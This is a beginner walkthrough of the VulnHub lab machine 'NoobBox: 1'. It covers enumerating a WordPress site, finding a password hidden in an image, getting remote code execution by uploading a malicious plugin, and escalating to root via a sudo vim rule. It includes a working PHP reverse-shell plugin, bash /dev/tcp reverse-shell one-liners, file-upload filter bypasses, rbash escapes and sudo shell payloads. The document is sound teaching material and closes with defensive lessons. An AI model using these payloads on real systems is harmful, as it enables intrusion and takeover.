# NoobBox: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an **isolated lab network**. Only attack
> machines you own or have explicit permission to test. Screenshots are
> placeholders — capture your own.

| Field | Value |
| --- | --- |
| **Machine** | NoobBox: 1 |
| **Difficulty** | Beginner |
| **Author** | Shadow Phreak |
| **Released** | 10 March 2021 |
| **VulnHub Entry** | https://vulnhub.com/entry/noobbox-1,664/ |
| **Download** | https://vulnhub.com/entry/noobbox-1,664/#download (mirror: https://download.vulnhub.com/noobbox/NoobBox.zip) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian/Ubuntu, Apache + PHP + WordPress) |

> **Note:** passwords, the WordPress path, and flag values **vary by build**. The
> values shown are from commonly shared builds of the downloadable VM.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target and scan it with `nmap`.
- How to enumerate a WordPress site: users, plugins/themes, and hidden files.
- Why brute-forcing **directories with file extensions** matters (finding an image
  that holds a password).
- How a leaked/weak password lets you into `wp-admin`.
- How WordPress admin access becomes **file-upload RCE** (a malicious plugin).
- How password reuse lets you pivot from `www-data` to a real user.
- How a `sudo vim` rule escapes an `rbash` and gives you root.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated host-only network.

```bash
# Identify your own IP and subnet. "eth0" is the lab NIC (name may differ).
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** Kali holds a `192.168.56.x` address (VirtualBox host-only)
> or `192.168.19x.x` (VMware). The target lives on the **same** subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)
> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# ARP-scan the subnet to list live hosts.
sudo arp-scan --interface=eth0 --localnet
# or: sudo nmap -sn 192.168.56.0/24
```

```text
192.168.56.101   08:00:27:dd:ee:ff    PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101`

![Finding the target host](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

```bash
# Full TCP sweep, then deep service detection on the open ports.
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 80,22 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.x ((Debian))
|_http-title: NoobBox
```

> **How to read it:**
> - Port **80** is the web server — our main target.
> - Port **22** is SSH — useful later once we have a shell/user.
> - Always scan **all** ports; on some builds a service hides on a high port.

```bash
# Confirm the site and look for a WordPress install.
curl -s http://192.168.56.101/ | head
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.101/wordpress/
```

```text
HTTP/1.1 200 OK
<title>NoobBox</title>
200
```

![Port and service scan](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Enumerate WordPress users and plugins

The landing page is a blog; the real app lives under `/wordpress/`.


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://192.168.56.101/wordpress/ -e u,ap,at
```

```text
[+] WordPress version identified
[+] Users Identified: noobbox  (login: noobbox)
```

> **Why it works:** WordPress leaks usernames through author pages
> (`/wordpress/?author=1`) and the REST API. `wpscan` collects these for us — we
> now know a valid login name: **`noobbox`**.

### 3.2 Find hidden files — including images

Directory brute-forcing normally looks for pages and scripts. On this box the
*password* is hidden inside an **image**, so we must fuzz **file extensions** too.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://192.168.56.101/FUZZ -e .jpg,.png,.jpeg,.gif \
     -of html -o scans/ffuf-images.html
```

```text
img.jpg                 [Status: 200, Size: 12345, Words: 1, Lines: 1]
```


> ### 📖 Concept — Steganography and file carving
>
> CTF authors hide data in files constantly. Know the layers, cheapest first:
>
> | Layer | Tool | What it finds |
> | --- | --- | --- |
> | **Metadata** | `exiftool img.jpg` | Comments, GPS, software version, **author**, dates |
> | **Trailing data** | `binwalk img.jpg`, `strings`, `xxd` | A ZIP or text appended *after* the image's end-of-file marker |
> | **Embedded files** | `binwalk -e`, `foremost`, `scalpel` | Carves out files hidden inside another |
> | **LSB steganography** | `zsteg`, `stegsolve` | Payload in the least-significant bits of pixel data |
> | **Password-protected** | `steghide extract -sf img.jpg` | Data hidden with a passphrase (try the box's other creds) |
>
> ```bash
> exiftool image.jpg
> binwalk image.jpg
> strings -n 6 image.jpg | head -50
> zsteg -a image.png
> steghide extract -sf image.jpg
> ```
>
> **Start with `exiftool` and `binwalk`.** They are instant and they account for most
> CTF "steganography" — which is usually just *a file appended to another file* or *a
> comment in the metadata*, not real LSB embedding. `binwalk` reporting a `Zip archive
> data` at a non-zero offset means exactly that: two files concatenated.
>
> If a ZIP is recovered and password-protected: `zip2john file.zip > zip.hash` then
> `john --wordlist=rockyou.txt zip.hash`, or `fcrackzip -D -u -p dict.txt file.zip`.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
# Download the image and inspect it.
curl -s http://192.168.56.101/img.jpg -o img.jpg
# View it (browser or an image viewer), or carve text out of it:
exiftool img.jpg
strings img.jpg | grep -i -E 'pass|5p4c3|admin'
```

```text
Password: 5p4c3
```

> **Why it works:** developers sometimes "hide" a password by writing it onto an
> image or embedding it in metadata. Brute-forcing only for extensions like
> `.php`/`.html` would miss an `.jpg`. Always fuzz with an extension list.

![Directory enumeration + leaked password in img.jpg](images/03-enum.png)

### 3.3 Log in to WordPress

Browse to `http://192.168.56.101/wordpress/wp-admin/` (or `wp-login.php`) and log
in with the discovered account.

```text
Username: noobbox
Password: 5p4c3
```

> **Why it works:** the leaked "password" from the image is in fact the WordPress
> account password. We are now **administrators** of the site.

### 3.4 Turn admin access into a shell — malicious plugin upload

An admin can install plugins, and a plugin is just a `.zip` full of PHP. Upload a
"plugin" whose PHP calls back to us — this is the classic file-upload RCE.


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# 1. Build a tiny malicious plugin on Kali.
mkdir -p evil && cd evil
cp /usr/share/webshells/php/php-reverse-shell.php evil.php
# Edit $ip -> 192.168.56.10 and $port -> 4444 inside evil.php.
cat > evil.php <<'EOF'
<?php
// Minimal reverse shell — replace IP/PORT with your own.
$sock = fsockopen("192.168.56.10", 4444);
$proc = proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock), $pipes);
?>
EOF
cd .. && zip -r evil.zip evil/
```

```text
  adding: evil/ (stored 0%)
  adding: evil/evil.php (deflated 40%)
```

```bash
# 2. On Kali: start the listener.
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

3. In WordPress: **Plugins → Add New → Upload Plugin**, choose `evil.zip`, click
   **Install Now**, then **Activate**.
4. Activate triggers the PHP, or simply visit the plugin file directly:

```bash
curl "http://192.168.56.101/wordpress/wp-content/plugins/evil/evil.php"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 40210
Linux N00bBox ... GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** having admin rights means we can upload and run arbitrary PHP
> on the server. The uploaded plugin is executed by Apache as **`www-data`**, so
> we receive a shell as that user. This is the "simple file upload RCE" noted on
> the box.

> **Shortcut with Metasploit:** the module
> `exploit/unix/webapp/wp_admin_shell_upload` does exactly this:
>
> ```bash
> msfconsole -q
> use exploit/unix/webapp/wp_admin_shell_upload
> set RHOSTS 192.168.56.101
> set TARGETURI /wordpress
> set USERNAME noobbox
> set PASSWORD 5p4c3
> run
> ```
>
> ```text
> [+] Authenticated with WordPress
> [+] Uploading payload...
> [*] Meterpreter session 1 opened ...
> ```

### 3.5 Upgrade the shell to a full TTY


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Pivot from `www-data` to a real user (password reuse)

```bash
# Who are the login users?
cat /etc/passwd | grep -i bash
```


> ### 📖 Concept — Escaping a restricted shell
>
> **`rbash`** (restricted bash) is bash started with `--restricted`. It blocks:
> changing directory (`cd`), setting or unsetting `SHELL`/`PATH`/`ENV`/`BASH_ENV`,
> command names containing `/`, output redirection with `>`, and `exec`/`source` of
> absolute paths.
>
> It is a *shell* restriction, not a security boundary — it only constrains that one
> process. **Anything that spawns a fresh shell escapes it.** Work through these:
>
> ```bash
> # 1. Does any permitted command spawn a shell?
> vim -c ':!sh'            # or :set shell=/bin/bash  then :shell
> less /etc/passwd         # then type !sh
> more, man (then !sh), ftp (!/bin/sh), gdb (-ex '!sh'), awk ('BEGIN{system("/bin/sh")}')
> find . -exec /bin/sh \; -quit
>
> # 2. Can you run an interpreter at all?
> python -c 'import os; os.system("/bin/sh")'
> perl -e 'exec "/bin/sh";'
> php -r "system('/bin/sh');"
>
> # 3. Is SSH available with a command override?
> ssh user@target -t "/bin/sh"          # -t forces a tty, bypassing the login shell
> ssh user@target -t "bash --noprofile --norc"
>
> # 4. Is the restriction only in the profile?
> bash --noprofile --norc               # a clean, unrestricted bash
> export SHELL=/bin/bash                # if you can reach env at all
>
> # 5. Can you write a file and execute it another way?
> echo '/bin/sh' > /tmp/x.sh            # redirection is often blocked — try tee
> ```
>
> **Check what you actually have first.** `echo $0` shows the shell; `set -o` lists
> options (look for `restricted on`); `echo $PATH` shows whether it is pinned;
> `compgen -c | head -50` lists runnable commands.
>
> **The general principle:** a restricted shell limits *one process*. Find any child
> process it lets you create, and the restriction does not apply there.
>
> **Deep dive:** [CONCEPTS §12 — Shells](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```text
root:x:0:0:root:/root:/bin/bash
noobbox:x:1000:1000:NoobBox,,,:/home/noobbox:/bin/rbash
```

```bash
# Try the WordPress password again — people reuse passwords.
su noobbox
# password: 5p4c3
```

```text
noobbox@N00bBox:/var/www/html$ id
uid=1000(noobbox) gid=1000(noobbox) groups=1000(noobbox)
```

> **Why it works:** the OS account `noobbox` uses the **same password** as the
> WordPress admin account. Password reuse across services is one of the most
> common real-world issues — always test credentials you already hold against
> other logins.

> **Note:** `noobbox`'s shell is `rbash` (a *restricted* bash). It blocks things
> like `cd`, paths, and redirection. We don't need to break out of it to escalate,
> though — `sudo` is still available.

### 4.2 Enumerate sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User noobbox may run the following commands on N00bBox:
    (ALL : ALL) /usr/bin/vim
```

> **How to read it:** `noobbox` may run **`/usr/bin/vim` as ANY user** (including
> root), with `ALL` meaning no restriction. `vim` can execute shell commands from
> inside the editor — so this is effectively unrestricted root.

### 4.3 Escape `rbash` and become root via `vim`

`vim` can run a shell with `:!` from its command mode. Passing it with `-c` runs
the command immediately on startup:

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

```text
root@N00bBox:/# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `vim` runs as root (via sudo) and can spawn child processes
> through `:!command`. Because the editor process is root, the shell it launches
> is also root. `-c` executes the command right away, so you drop straight into a
> root shell. ("GTFOBins" documents this for `vim`.)

> **Why it also fixes `rbash`:** this is a brand-new root bash started by `vim`,
> not the restricted shell, so the `rbash` limits no longer apply.

![Privilege escalation via sudo vim](images/07-privesc.png)

### 4.4 The root flag

```bash
cd /root
ls -la
cat /root/root.txt
```

```text
<root flag — varies by build (some builds base64-encode it)>
```

> **Tip:** if the flag looks like `c29tZXRoaW5n`, decode it with
> `echo '<value>' | base64 -d`.

![Root flag captured](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | WordPress user enumeration | `/wordpress/` REST API / author pages | Valid login `noobbox` discovered |
| 2 | Password hidden in a web-exposed image | `/img.jpg` | Weak credential recovered (`5p4c3`) |
| 3 | Weak credential → admin panel | `wp-admin` | Full WordPress administrator access |
| 4 | Unrestricted plugin upload (RCE) | Plugins → Add New | Arbitrary PHP execution as `www-data` |
| 5 | Password reuse across services | OS user `noobbox` | Pivot from `www-data` to a login user |
| 6 | Dangerous `sudo` rule | `(ALL:ALL) /usr/bin/vim` | `vim :!bash` → unrestricted root |

---

## 6. Defensive lessons (blue team)

- **Prevent username enumeration** in WordPress (disable author archives / REST
  user endpoints, use a plugin such as an auth-hardening suite).
- **Never hide secrets in client-reachable files.** Passwords written into images
  or metadata are still exposed. Use a password manager and strong, unique values.
- **Enforce strong, unique passwords** and MFA on all admin panels; block
  `wp-admin`/`wp-login.php` from untrusted networks where possible.
- **Restrict plugin/theme installation.** Only allow vetted plugins, disable the
  file editor with `define('DISALLOW_FILE_EDIT', true);`, and run a WordPress
  security/audit plugin.
- **Do not reuse passwords** between web apps and OS accounts; rotate credentials
  and monitor for use of the same secret in multiple places.
- **Sudo least privilege:** never grant `sudo` to full-featured editors or tools
  that can spawn shells (`vim`, `find`, `less`, `awk`, …). Check GTFOBins before
  granting any `sudo` rule, and avoid `NOPASSWD` for anything powerful.
- **Keep software patched** and remove unused plugins, themes, and users.
- **Detection opportunities:** alert on new plugin installs, on `www-data`
  spawning interactive shells or making outbound connections, and on `sudo vim`
  invocations. Forward Apache/PHP logs and auditd to a SIEM.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry (download + author notes): https://vulnhub.com/entry/noobbox-1,664/
- NepCodeX — NoobBox walkthrough: https://nepcodex.com/2021/07/noobbox-walkthrough-vulnhub-writeup/
- Kong Hex — NoobBox walkthrough: https://khdxs7.github.io/ (search "NoobBox")
